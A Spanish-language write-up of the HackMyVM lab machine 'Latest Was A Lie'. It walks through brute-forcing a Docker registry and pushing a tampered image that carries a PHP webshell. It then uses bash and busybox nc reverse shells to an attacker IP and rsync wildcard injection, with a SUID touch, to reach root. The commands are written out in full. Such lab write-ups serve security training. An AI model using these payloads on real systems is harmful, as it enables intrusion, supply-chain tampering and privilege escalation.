---
author: Lenam
pubDatetime: 2026-04-15T00:00:00Z
title: WriteUp Latest Was A Lie - HackMyVM
urlSlug: latest-was-a-lie-writeup-hackmyvm-es
featured: true
draft: false
ogImage: "../../../assets/images/latest-was-a-lie/OpenGraph.png"
tags:
    - writeup
    - hackmyvm
    - docker-registry
    - brute-force
    - php
    - rce
    - rsync
    - wildcard
    - privilege-escalation
    - suid
    - supply-chain
description:
    "Writeup de la máquina Latest Was A Lie (HackMyVM): laboratorio Linux con servicios web y Docker, donde un ataque de cadena de suministro (sustituir o alterar la imagen que consume el despliegue) abre la puerta a consolidación en el host y escalada de privilegios."
lang: es
translationId: latest-was-a-lie-writeup-hackmyvm
---

![HackMyVM](../../../assets/images/latest-was-a-lie/OpenGraph.png)

Writeup de la máquina **Latest Was A Lie** de [HackMyVM](https://hackmyvm.eu/): parte de un **registro Docker** accesible con credenciales que se pueden obtener por fuerza bruta; al poder **publicar de nuevo** la misma etiqueta de imagen que usa la plataforma, se altera la aplicación PHP alojada en contenedores hasta conseguir **RCE**. Ese encaje es el de un **ataque a la cadena de suministro** centrado en el **artefacto** (la imagen): el despliegue confía en lo que hay en el registry, y ese contenido puede sustituirse si quien ataca obtiene permiso de **push**. A partir de ahí, un job de **rsync** que expande comodines en ficheros `.txt` permite pasar al host como `backupusr`, y un segundo rsync periódico como **root** —más un **`touch` SUID** para colocar ficheros donde el directorio no es escribible de forma normal— cierra la escalada hasta `root`.


![HackMyVM](../../../assets/images/latest-was-a-lie/latestwasalie.png)


## Tabla de contenido

- [Tabla de contenido](#tabla-de-contenido)
- [Enumeración](#enumeración)
- [Intrusión](#intrusión)
  - [Credenciales en el Docker Registry (puerto 5000)](#credenciales-en-el-docker-registry-puerto-5000)
  - [Inspección del registro con credenciales válidas](#inspección-del-registro-con-credenciales-válidas)
  - [Sustitución de la imagen en el registro (misma etiqueta `latest`)](#sustitución-de-la-imagen-en-el-registro-misma-etiqueta-latest)
  - [Acceso RCE desde la web](#acceso-rce-desde-la-web)
  - [Salida del contenedor hacia el host](#salida-del-contenedor-hacia-el-host)
- [Escalada de privilegios](#escalada-de-privilegios)
- [Referencias](#referencias)

---

## Enumeración

El primer paso consiste en identificar qué servicios expone la máquina y con qué versiones, para decidir por dónde continuar el ataque.

![Pantalla Virtual Box Machine](../../../assets/images/latest-was-a-lie/20260407_025940_image.png)

El primer `nmap` recorre **todos los puertos TCP** (`-p-`), asume el host como activo sin ping ICMP (`-Pn`, útil cuando el firewall bloquea ping pero los puertos responden) y evita resolución DNS inversa (`-n`) para que el escaneo sea más rápido y predecible. El resultado muestra tres puertos abiertos: **22** (SSH), **80** (HTTP) y **5000** (en el segundo escaneo se confirma que no es “upnp” genérico sino **HTTP del Docker Registry**).

```bash
$ nmap -p- -Pn -n 10.0.2.15  
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-04-07 02:59 CEST
Nmap scan report for 10.0.2.15
Host is up (0.00018s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
5000/tcp open  upnp
MAC Address: 08:00:27:6F:9C:3C (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 2.00 seconds

```

El segundo `nmap` se lanza **solo** sobre esos puertos y añade detección de servicio y scripts por defecto (`-sV` versiona el banner; `-sC` ejecuta scripts `safe`). Así se obtienen el OpenSSH concreto, Apache en el 80 y la API del registro Docker en el 5000.

```bash
$ nmap -p22,80,5000 -sVC -Pn -n 10.0.2.15  
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-04-07 03:00 CEST
Nmap scan report for 10.0.2.15
Host is up (0.00054s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 10.0p2 Debian 7+deb13u1 (protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.66 ((Debian))
|_http-title: Default site
|_http-server-header: Apache/2.4.66 (Debian)
5000/tcp open  http    Docker Registry (API: 2.0)
|_http-title: Site doesn't have a title.
MAC Address: 08:00:27:6F:9C:3C (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 36.98 seconds

```

```bash
$ curl http://10.0.2.15                      
<!DOCTYPE html>
<html>
<head>
  <title>Default site</title>
  <meta http-equiv="Refresh" content="10; URL=http://latestwasalie.hmv/" />
</head>
<body>
  <h1>Default site</h1>
  <p>No application configured for this host.</p>
  <p>Check the available files on this server.</p>
</body>
</html>
```

Al pedir la web por **IP**, la respuesta es una página por defecto que, mediante `<meta http-equiv="Refresh">`, redirige al **nombre de host** `latestwasalie.hmv`. Sin esa entrada en resolución de nombres, el navegador o `curl` no podrían llegar al virtual host correcto: por eso se añade la línea al fichero `hosts` del atacante y se vuelve a consultar la URL con el nombre. `tee -a` añade la línea a `/etc/hosts` (con `sudo` porque ese archivo es del sistema).

```bash
echo "10.0.2.15 latestwasalie.hmv" | sudo tee -a /etc/hosts
curl http://latestwasalie.hmv
```

En el HTML servido para ese host aparece un comentario al pie que nombra al usuario **`adm`**, lo que sugiere un posible usuario válido en SSH o en el registro Docker (no prueba que exista en ambos, pero acota nombres a probar).

Comentario al final del código con usuario `adm`:

```html
...
...
    <div class="footer">
      © 2026 LWAL Platform. All rights reserved.
    </div>
  </div>
</body>
</html>
<!-- Last deployment on April 6, 2026 by adm -->
```

---

## Intrusión

### Credenciales en el Docker Registry (puerto 5000)

El registro Docker expone la API HTTP en el puerto **5000**. La ruta `/v2/` es el endpoint habitual del **Registry HTTP API V2**; el siguiente paso es probar credenciales contra ese endpoint.

Se usa **Hydra** con usuario fijo `-l adm` (coherente con el comentario HTML), lista de contraseñas `rockyou.txt`, objetivo `10.0.2.15` y puerto explícito `-s 5000` porque el servicio no es el 80. El módulo `http-get` prueba peticiones GET a `/v2/`. Los flags `-t` y `-T` controlan paralelismo; `-f` detiene al encontrar la primera credencial válida; `-V` muestra cada intento (más ruidoso pero útil para depurar).

```bash
hydra -l adm -P /usr/share/wordlists/rockyou.txt 10.0.2.15 -s 5000 http-get /v2/ -t 64 -T 256 -w 1 -W -f -V
```

Obtenemos password rápidamente `adm:lover1`.

```bash
[5000][http-get] host: 10.0.2.15   login: adm   password: lover1
```

### Inspección del registro con credenciales válidas

Con **autenticación básica** (`curl -u usuario:contraseña`) se consultan endpoints estándar del Registry V2:

- `GET /v2/_catalog` lista los **repositorios** (aquí `latestwasalie-web`).
- `GET /v2/<nombre>/tags/list` lista las **etiquetas** (aquí `latest`).
- `GET /v2/<nombre>/manifests/<tag>` devuelve el **manifiesto** de la imagen. La cabecera `Accept: application/vnd.oci.image.index.v1+json` pide el índice OCI cuando la imagen está publicada en ese formato; en la respuesta aparecen **digests** de manifiestos.

```bash
$ curl -u adm:lover1 http://10.0.2.15:5000/v2/_catalog
{"repositories":["latestwasalie-web"]}
```

```bash
$ curl -u adm:lover1 http://10.0.2.15:5000/v2/latestwasalie-web/tags/list
{"name":"latestwasalie-web","tags":["latest"]}
```

```bash
$ curl -u adm:lover1 -s \
  -H 'Accept: application/vnd.oci.image.index.v1+json' \
  http://10.0.2.15:5000/v2/latestwasalie-web/manifests/latest
{
  "schemaVersion": 2,
  "mediaType": "application/vnd.oci.image.index.v1+json",
  "manifests": [
    {
      "mediaType": "application/vnd.oci.image.manifest.v1+json",
      "digest": "sha256:5c8cef789fd62bad53b461b01d47975b2ac36e9647ec4dc4920258efeb43ea39",
      "size": 4641,
      "platform": {
        "architecture": "amd64",
        "os": "linux"
      }
    },
    {
      "mediaType": "application/vnd.oci.image.manifest.v1+json",
      "digest": "sha256:48c1b76fe6b5ab579468bde5fcb28788ff07dc8bf2ec492f073fee52e65ac555",
      "size": 564,
      "annotations": {
        "vnd.docker.reference.digest": "sha256:5c8cef789fd62bad53b461b01d47975b2ac36e9647ec4dc4920258efeb43ea39",
        "vnd.docker.reference.type": "attestation-manifest"
      },
      "platform": {
        "architecture": "unknown",
        "os": "unknown"
      }
    }
  ]
}
```

### Sustitución de la imagen en el registro (misma etiqueta `latest`)

Si se logran credenciales, es posible sobrescribir la imagen `latest` y así intentar que un futuro redeploy use una versión maliciosa. Para evitar esto: usa etiquetas inmutables, firmas y verifica digests.

Descargamos la imagen de Docker del registro, la modificamos agregando nuestro payload y luego la subimos nuevamente al repositorio utilizando la misma etiqueta.

> Nota: Este procedimiento puede realizarse de diferentes formas; aquí se muestra una de las opciones, procurando evitar la mayoría de alternativas, aunque puede que se me haya pasado por alto alguna.

Antes de autenticarnos con `docker login`, hay que tener en cuenta un detalle práctico: este registry está expuesto por **HTTP** en el puerto `5000`, no por HTTPS. Por defecto, Docker intenta hablar con los registries usando TLS; si no se configura como registro inseguro, comandos como `docker login`, `docker pull` o `docker push` pueden fallar con un error del estilo `server gave HTTP response to HTTPS client`.

En la máquina atacante, añadimos el registry a la lista de `insecure-registries` del demonio Docker. Si `/etc/docker/daemon.json` ya existe, no conviene sobrescribirlo directamente: hay que fusionar esta clave con la configuración existente.

```bash
sudo mkdir -p /etc/docker

cat <<'EOF' | sudo tee /etc/docker/daemon.json
{
  "insecure-registries": ["10.0.2.15:5000"]
}
EOF

sudo systemctl restart docker
```

Después de reiniciar Docker, el cliente ya podrá comunicarse con `10.0.2.15:5000` usando HTTP.

`docker login` contra `10.0.2.15:5000` guarda credenciales para **push** y **pull** hacia ese registro (el demonio Docker usará autenticación al hablar con la API del registry).

Con el usuario `adm:lover1`.

```bash
docker login 10.0.2.15:5000
```

Secuencia de Docker utilizada:

- `docker pull` trae la capa publicada como `latestwasalie-web:latest` desde el registro vulnerable.
- `docker create` instancia un contenedor **parado** a partir de esa imagen (nombre `latestwasalie-web`), sin arrancarlo aún.
- `docker start` arranca ese contenedor: así el filesystem de la aplicación queda disponible para `docker exec`.
- `docker exec -u 0` abre un shell **como root dentro del contenedor** (`-u0` es UID 0), `-it` asigna TTY interactivo para trabajar en bash.

```bash
# Descarga la imagen 'latestwasalie-web:latest' desde el registro Docker
docker pull 10.0.2.15:5000/latestwasalie-web:latest
# Crea un nuevo contenedor a partir de la imagen descargada
docker create --name latestwasalie-web 10.0.2.15:5000/latestwasalie-web:latest
# Inicia el contenedor creado
docker start latestwasalie-web
# Accede al contenedor como root con una terminal interactiva bash
docker exec -u 0 -it latestwasalie-web /bin/bash
```

Una vez que hayas accedido al contenedor desde la terminal:

Se añade al final de `index.php` un **webshell mínimo**: si llega el parámetro `cmd` por la petición HTTP, se ejecuta en el servidor con `system()`. Eso solo tendrá sentido si PHP puede ejecutar comandos; en muchos entornos endurecidos, `disable_functions` bloquea precisamente `system`, `exec`, etc.

```bash
echo '<?php if(isset($_REQUEST["cmd"])){ echo "<pre>"; $cmd = ($_REQUEST["cmd"]); system($cmd); echo "</pre>"; die; }?>' >> /var/www/latestwasalie/index.php
```

Si buscamos la configuración de PHP del contenedor, encontramos el fichero `zz-hardening.ini` donde está configurada la directiva `disable_functions`. Esto bloquearía nuestro script añadido al final de `index.php`, ya que dicha directiva suele deshabilitar funciones críticas como `system()`. Por este motivo, necesitamos dejarla vacía para restaurar la posibilidad de ejecutar comandos desde PHP.

```bash
sed -i 's/^disable_functions=.*/disable_functions=/' /usr/local/etc/php/conf.d/zz-hardening.ini
```

`sed -i` edita el fichero **in situ**. La expresión sustituye la línea que empieza por `disable_functions=` por `disable_functions=` vacío, es decir, **vacía la lista de funciones deshabilitadas** en `zz-hardening.ini`, de modo que `system()` vuelve a estar permitido (siempre que no haya otra capa que lo impida).


Salimos del contenedor.

```bash
exit
```

Después de modificar el contenedor, guardamos la imagen y la subimos nuevamente al repositorio:

- `docker commit` **congela** el estado actual del contenedor (capas modificadas) en una nueva imagen etiquetada hacia el mismo registry y nombre.
- `docker push` **sobrescribe** la etiqueta `latest` en el servidor: el entorno que despliega o tira de esa imagen pasará a usar el código alterado.

```bash
docker commit latestwasalie-web 10.0.2.15:5000/latestwasalie-web:latest
docker push 10.0.2.15:5000/latestwasalie-web:latest
```

### Acceso RCE desde la web

Si el servicio web se despliega a partir de la imagen del contenedor y tenemos suerte (es decir, aplican los cambios y no hay otros controles adicionales), en menos de un minuto deberíamos tener acceso a la ejecución remota de comandos (RCE) a través del webshell insertado.

Podemos comprobarlo utilizando `curl`, pasando el parámetro `cmd=id` en la query string; si el webshell funciona, la respuesta debe incluir la salida del comando `id` en el servidor (normalmente mostrará el usuario bajo el que corre el proceso web, por ejemplo `www-data`):

```bash
curl http://latestwasalie.hmv/?cmd=id
```

Para obtener una shell interactiva, en la máquina atacante se abre **netcat en escucha** en el puerto elegido (aquí 1234): `-l` listen, `-v` verbose, `-n` sin DNS, `-p` puerto.

```bash
nc -lvnp 1234
```

y en otra consola

La URL codifica un one-liner de **bash reverse shell**: `nohup` desacopla del terminal para que el proceso sobreviva a cortes breves; la redirección a `/dev/tcp/IP/puerto` es una característica de bash para abrir TCP saliente hacia el atacante. Los `%XX` son el **URL-encoding** de espacios, comillas y caracteres especiales para que `curl` no rompa la petición.

```bash
curl http://latestwasalie.hmv/?cmd=nohup%20bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.0.2.12%2F1234%200%3E%261%27%20%3E%20%2Fdev%2Fnull%202%3E%261%20%26
```

Una vez dentro, observamos contenido del fichero `export.php` y la carpeta `/data/exports`.

> Atención: La reverse shell obtenida se cerrará al poco tiempo, por lo que debemos trabajar rápido o intentar establecer una shell más estable, algo que hasta ahora no he conseguido.

`head` muestra el inicio de `export.php`: se ve que la aplicación usa rutas bajo `/data/exports` y `/data/state`, con límites configurables por variables de entorno (`EXPORT_MAX_FILES`, `EXPORT_MIN_INTERVAL`).

```bash
www-data@5bef2e124b8b:/var/www/latestwasalie$ head export.php
<?php
$exportDir = '/data/exports';
$stateDir  = '/data/state';

$maxFiles    = (int)(getenv('EXPORT_MAX_FILES') ?: '20');
$minInterval = (int)(getenv('EXPORT_MIN_INTERVAL') ?: '10');

if (!is_dir($exportDir)) {
    http_response_code(500);
    echo "Export directory not available.";
```

```bash
www-data@8a82d62a4571:/var/www/latestwasalie$ ls -la /data/exports
total 28
drwxrwxrwx 2 root root 4096 Apr  4 06:15 .
drwxr-xr-x 1 root root 4096 Apr  4 11:53 ..
-rw-r--r-- 1 1000 1000  232 Apr  4 11:53 .rsync_cmd
-rw-r--r-- 1 root root   93 Apr  4 02:40 report_20260404_024041_7a6e1f.txt
-rw-r--r-- 1 root root   93 Apr  4 02:40 report_20260404_024052_3606d7.txt
-rw-r--r-- 1 root root   93 Apr  4 02:41 report_20260404_024105_d10ac5.txt

```

### Salida del contenedor hacia el host

Hasta aquí la sesión es la de **`www-data`** dentro del contenedor de la aplicación. El siguiente paso es **abandonar ese contexto** y obtener una shell en la máquina anfitriona: la pista está en el directorio de exports y en un **rsync** periódico que usa comodines.

Ahí encontramos un archivo oculto llamado `.rsync_cmd`, el cual contiene información clave que nos será de gran utilidad.

El fichero documenta un **rsync** lanzado con `-e 'ssh -i ...'` hacia `localhost`, copiando `*.txt` desde un directorio de exports. Eso encaja con un job periódico que empaqueta o sincroniza informes `.txt`.

```bash
cat /data/exports/.rsync_cmd
```

```text
# Comando rsync ejecutado el sáb 04 abr 2026 15:00:02 CEST
rsync -e 'ssh -i /home/backupusr/.ssh/id_ed25519' -av *.txt localhost:/home/backupusr/backup/

# Usuario: backupusr
# PID: 155545
# Directorio actual: /srv/platform/appdata/exports
# Directorio destino: localhost:/home/backupusr/backup

```

Observamos que el proceso de rsync es vulnerable al uso de wildcards y que tenemos permisos de escritura en dicha carpeta.

En **rsync**, el patrón `*.txt` se expande en el **shell del lado que lanza el comando**. Si un atacante puede escribir en ese directorio, puede crear nombres de archivo que, al expandirse, inyecten **opciones adicionales** de rsync (técnica relacionada con el abuso de argumentos vía ficheros cuyo nombre empieza por `-`). El listado anterior muestra el directorio con permisos `drwxrwxrwx` (world-writable), lo que permite colocar esos ficheros.

Ahora, configuramos un listener en el puerto `443`.

```bash
nc -lvnp 443
```

y en el contenedor ejecutamos.

Se crea un `.txt` cuyo contenido es un comando que abre conexión saliente hacia el atacante; `chmod +x` no cambia el hecho de que rsync copia **contenido**, pero puede formar parte del ritual del exploit usado. El `touch` con nombre `'-e sh shell.txt'` pretende forzar que la expansión de `*.txt` introduzca una opción `-e` a rsync (intérprete remoto / shell) seguida de argumentos, de modo que el binario interprete parte del nombre como flags — vector clásico de **wildcard injection** en rsync/cron.

```bash
echo "bash -c 'busybox nc 10.0.2.12 443 -e bash'" > /data/exports/shell.txt
chmod +x /data/exports/shell.txt
touch /data/exports/'-e sh shell.txt'
```

Después de esperar aproximadamente un minuto, obtenemos acceso a una shell como el usuario `backupusr`, fuera del contenedor.

Para lograr una persistencia más robusta, podemos aprovechar el servicio SSH añadiendo una clave pública al archivo `~/.ssh/authorized_keys`. De esta manera, conseguimos una shell mucho más estable y garantizamos la persistencia del acceso.

Podemos obtener la flag del usuario.

```bash
cat /home/backupusr/user.txt
```

---

## Escalada de privilegios

> Si ejecutamos LinPEAS, veremos un aviso relacionado con una vulnerabilidad del kernel (CVE) y varios errores de permisos en sockets. En principio, estos parecen ser falsos positivos, aunque no estaría de más revisarlos en mayor profundidad. De cualquier manera, representan posibles vectores alternativos para la escalada de privilegios.  
> 
> Por cierto, si alguien ha conseguido escalar privilegios utilizando alguno de los casos que detecta LinPEAS aquí, me encantaría que lo explicara para que todos podamos aprender y compartir conocimientos.

Al ejecutar pspy64, detectamos que existe otro proceso que realiza copias mediante rsync, esta vez ejecutado por el usuario root. Este proceso también parece ser vulnerable al uso de comodines (wildcards) en rsync, de manera similar al método que utilizamos previamente para escapar del contenedor.

`pspy` es una herramienta **sin privilegios** que observa creación de procesos (vía polling de `/proc`): permite ver **qué** ejecuta el sistema y **cada cuánto**, sin necesidad de acceso root. Aquí se descarga el binario al host víctima con `wget`, se marca ejecutable y se lanza.

```bash
busybox wget http://10.0.2.12/pspy64
chmod +x pspy64
./pspy64
```

![Resultado pspy64](../../../assets/images/latest-was-a-lie/20260410_204138_image.png)

No es posible acceder directamente al archivo `/root/backups.sh`, pero podemos identificar los archivos que este script copia (como `auth`, `config`, `docker-compose.yml`, etc.) para intentar localizar el directorio correspondiente.

El bucle usa `find` para localizar `docker-compose.yml`; por cada ruta, toma el directorio padre y comprueba si existen **también** `auth` y `config`. Solo imprime directorios donde coinciden los tres criterios, reduciendo ruido frente a un `find` plano.

```bash
find / -name "docker-compose.yml" 2>/dev/null | while read f; do d=$(dirname "$f"); [ -e "$d/auth" ] && [ -e "$d/config" ] && echo "$d"; done
```

Encontramos que es la carpeta `/opt/registry`.

```bash
backupusr@latestwasalie:~$ ls -la /opt/registry
total 28
drwxr-xr-x 5 root root 4096 abr  4 11:44 .
drwxr-xr-x 6 root root 4096 abr  4 03:09 ..
drwxr-xr-x 2 root root 4096 abr  4 02:51 auth
drwxr-xr-x 2 root root 4096 abr  4 02:52 config
drwxr-xr-x 3 root root 4096 abr  4 03:08 data
-rw-r--r-- 1 root root  421 abr  4 02:53 docker-compose.yml
-rw-rw-rw- 1 root root   97 abr  4 11:44 note.txt

```

No tenemos permisos para crear archivos nuevos dentro de la carpeta, pero sí podemos editar el contenido del fichero `note.txt`.

Además, si buscamos archivos con el bit SUID activado, encontraremos que el binario `touch` posee este permiso. Esto nos permite crear archivos en la carpeta `/opt/registry` utilizando dicho binario, a pesar de las restricciones normales de permisos.

`find / -perm -4000` lista binarios con bit **SUID**: al ejecutarlos, el proceso adopta temporalmente la identidad del **dueño del fichero** (aquí root para `/usr/bin/touch`). Un `touch` SUID de root puede **crear** ficheros en directorios donde un usuario normal no podría, lo que combina con el rsync por wildcards si el script de root procesa patrones tipo `*.txt` en ese directorio.

```bash
backupusr@latestwasalie:~$ find / -perm -4000 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/touch
/usr/bin/su
/usr/bin/umount
/usr/bin/mount
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/chfn
```

Para realizar la escalada de privilegios aprovechando la vulnerabilidad del proceso de rsync encontrado, realizamos los siguientes pasos:

En nuestra máquina atacante, preparamos un listener con netcat:

```bash
nc -lvnp 443
```

Luego, en la máquina víctima, con el usuario `backupusr`, ejecutamos el ataque.

Se escribe el payload en `note.txt` y se usa `touch` con un nombre de fichero que comienza por `-e` para que, al expandir comodines, rsync interprete argumentos extra — misma familia de abuso que en `/data/exports`, pero ahora en el directorio del registry y con el job de **root**.

```bash
echo "busybox nc 10.0.2.12 443 -e bash" > /opt/registry/note.txt
touch /opt/registry/'-e sh note.txt'
```

Después de esperar aproximadamente un minuto, logramos obtener una nueva reverse shell, esta vez con privilegios de usuario root. Ahora sí tenemos acceso para leer la flag final.

```bash
cat /root/root.txt
```

Con acceso root, ahora también podríamos modificar archivos críticos como `/etc/shadow` o `/etc/passwd` para crear usuarios o cambiar contraseñas, o incluso añadir nuestra clave pública SSH a `/root/.ssh/authorized_keys` para lograr persistencia y acceso directo en el futuro, mejorando así la revshell conseguida.

> ¡Gracias por leer este writeup! Espero que te haya servido, que hayas aprendido algo nuevo o al menos que te hayas divertido siguiendo el proceso. ¡Nos vemos en el próximo reto!

---

## Referencias

Material de consulta alineado con lo que aparece en el writeup (Docker/registry, comodines/`rsync`, binarios **SUID** y monitorización de procesos):

- [HackTricks — Wildcards / trucos con `rsync` (inyección de argumentos)](https://hacktricks.wiki/en/linux-hardening/privilege-escalation/wildcards-spare-tricks.html?highlight=rsync%20wildca#rsync)
- [HackTricks — Pentesting Docker Registry (puerto 5000)](https://hacktricks.wiki/en/network-services-pentesting/5000-pentesting-docker-registry.html)
- [HackTricks — Pentesting Docker (conceptos básicos)](https://hacktricks.wiki/en/network-services-pentesting/2375-pentesting-docker.html?highlight=docker#docker-basics)
- [HackTricks — `euid`, `ruid` y bit **setuid** (por qué un binario SUID actúa con la identidad del dueño)](https://hacktricks.wiki/en/linux-hardening/privilege-escalation/euid-ruid-suid.html)
- [pspy — monitorizar procesos sin root](https://github.com/DominicBreuker/pspy) (útil para ver tareas periódicas como el segundo `rsync` como root)
